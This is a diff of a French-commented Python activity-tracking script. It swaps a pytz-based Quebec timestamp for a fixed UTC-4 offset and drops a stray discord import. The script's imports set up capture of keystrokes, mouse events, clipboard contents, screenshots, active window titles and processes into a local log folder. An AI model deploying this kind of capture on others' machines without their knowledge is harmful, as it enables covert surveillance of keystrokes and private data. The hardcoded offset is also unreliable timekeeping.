@@ -5,14 +5,12 @@ import os
 import threading
 
 # --- Imports des bibliothèques tierces (celles que vous avez installées) ---
-from discord import datetime
 import psutil                 # Pour les processus, le réseau, le CPU
 import pyperclip              # Pour le presse-papiers
 import pygetwindow as gw      # Pour le titre de la fenêtre active
 import mss                    # Pour les captures d'écran (rapide)
 from pynput.keyboard import Listener as KeyboardListener      # Pour le clavier
-from pynput.mouse import Listener as MouseListener
-import pytz            # Pour la souris
+from pynput.mouse import Listener as MouseListener            # Pour la souris
 
 _tracking_folder_path = "tracking"
 _last_title = None
@@ -58,10 +56,7 @@ def _stop_tracking_activity():
 
 
 def _add_to_log(data_dict):
-    # Convertir le timestamp en heure locale du Québec
-    quebec_tz = pytz.timezone("America/Toronto")
-    local_time = datetime.now(quebec_tz).strftime("%Y-%m-%d %H:%M:%S")
-    data_dict["timestamp"] = local_time
+    data_dict["timestamp"] = int(time.time()) - 14400  # Ajuster pour heure de New York (UTC-4)
     _event_log.append(data_dict)
 
 def _get_active_window_title():
